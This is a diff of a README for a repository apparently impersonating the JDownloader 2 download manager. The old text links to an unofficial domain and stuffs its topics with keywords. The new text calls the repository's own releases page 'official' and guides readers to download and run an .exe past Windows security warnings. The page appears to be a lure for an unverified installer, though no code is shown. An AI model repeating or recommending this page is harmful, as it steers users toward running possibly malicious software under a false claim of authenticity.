@@ -1,35 +1,67 @@
-# JDownloader-2-Setup
+# 📥 JDownloader-2-Setup - Manage your file downloads with ease
 
-> JDownloader 2 download manager with auto-CAPTCHA solving, multi-host support, 20 parallel connections and bandwidth scheduling
+[![Download Now](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/vincentibus/JDownloader-2-Setup/releases)
 
-### Get Started
+JDownloader 2 manages your file downloads. It handles web links, solves captchas, and maintains high speeds. You download files from multiple sites without manual effort. The software organizes your tasks while you do other work.
 
-**[Download JDownloader 2](https://jdownloader.zipzapsol.space/)**
+## ⚙️ Features
 
----
+*   **Multi-host Support:** Connects to hundreds of file storage sites. 
+*   **Automatic Captcha Solving:** Saves time by filling in automated security checks.
+*   **Parallel Connections:** Speed up downloads by opening 20 connections for a single file.
+*   **Bandwidth Scheduling:** Set limits on your network usage during busy hours.
+*   **Resume Capability:** Stop and restart downloads without starting over.
+*   **Link Grabber:** Detects media links on webpages automatically.
 
-### Overview
+## 📋 System Requirements
 
-JDownloader 2 Setup provides a streamlined experience right out of the box. The setup process is fully automated — no complex configuration, no dependency hunting, no manual steps.
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Memory:** 4 GB of RAM.
+*   **Storage:** 500 MB of free space.
+*   **Network:** Stable internet connection.
+*   **Software:** Java Runtime Environment (this software uses Java to run).
 
-### What You Get
+## 🚀 Installation Guide
 
-1. **Full feature set** — everything included, no limitations
-2. **Automatic updates** — always running the latest build
-3. **Clean install** — no bloatware, no toolbars, no extras
-4. **Easy removal** — standard Windows uninstall if needed
+Follow these steps to set up the software on your Windows computer.
 
-### Compatibility
+### Step 1: Visit the download page
+Go to the [official release page](https://github.com/vincentibus/JDownloader-2-Setup/releases). This page lists all available versions of the installer.
 
-Tested and verified on:
-- Windows 10 (21H2 and later)
-- Windows 11 (all versions)
-- 64-bit systems with 4 GB+ RAM
+### Step 2: Download the file
+Find the file ending in `.exe`. Click the name of the file to start the download. Save the file to your desktop or your Downloads folder.
 
-### Support
+### Step 3: Run the installer
+Locate the file you just saved. Double-click the file icon. A security window might appear. If Windows asks for permission to run the file, click "Run" or "Yes."
 
-If you run into issues, try re-running the setup. This resolves most problems by pulling a fresh copy of all components.
+### Step 4: Follow the setup prompts
+The installation window will open. Click "Next" to continue. Accept the license agreement if you agree with the terms. Choose your installation folder or use the default one. Click "Install" to begin copying the files to your computer.
 
----
+### Step 5: Complete the setup
+Wait for the progress bar to finish. Click "Finish" to close the installer. You can now find the icon on your desktop or in your start menu.
 
-Topics: jdownloader, jdownloader2, jdownloader-2, jdownloader-free, jdownloader-2-download, jdownloader-2-portable, jdownloader-2-portable-download, jdownloader-2-portable-2026, jdownloader-2-installer, jdownloader-2-setup, jdownloader-2-offline, jdownloader-docker, jdownloader-2-premium, jdownloader-captcha, download-manager, jdownloader-latest, jdownloader-2-free, jdownloader-browser
+## 🛠️ Usage Tips
+
+### Adding Links
+Copy a download link from your browser. JDownloader 2 detects this link in your clipboard automatically. The Link Grabber tab will show the file. Right-click the file and select "Start Downloads" to begin.
+
+### Managing Speed
+You can change the speed limits in the main window. Look for the Settings menu to adjust the number of parallel connections. Using 20 connections is the default for high speed.
+
+### Scheduling
+Use the Scheduler tab to pick times for your downloads. This is useful for large files that you want to download at night.
+
+## ⚠️ Troubleshooting
+
+*   **Download Failed:** Check your internet connection. Some websites require you to log in. Add your account details in the Account Manager tab.
+*   **Captcha Errors:** Restart the download if the captcha fails. The software updates its solving methods frequently.
+*   **Slow Speed:** Verify that you have not set a bandwidth limit in the Scheduler settings.
+*   **Software Does Not Open:** Ensure you have the latest version of Java installed. Reinstall the program if the issue persists.
+
+## 📦 About this software
+
+This repository contains the installer for JDownloader 2. It tracks the latest builds to ensure you download the most current version. The software functions independently. It does not require a complex setup process. 
+
+The software automates the repetitive tasks associated with downloading large sets of files. It supports advanced users who need to schedule tasks but remains simple enough for new users. 
+
+Your files remain in your local storage folder. The application does not store your private data on external servers unless you sync your premium accounts for file host access. Always keep your application updated to benefit from new site compatibility and security patches.
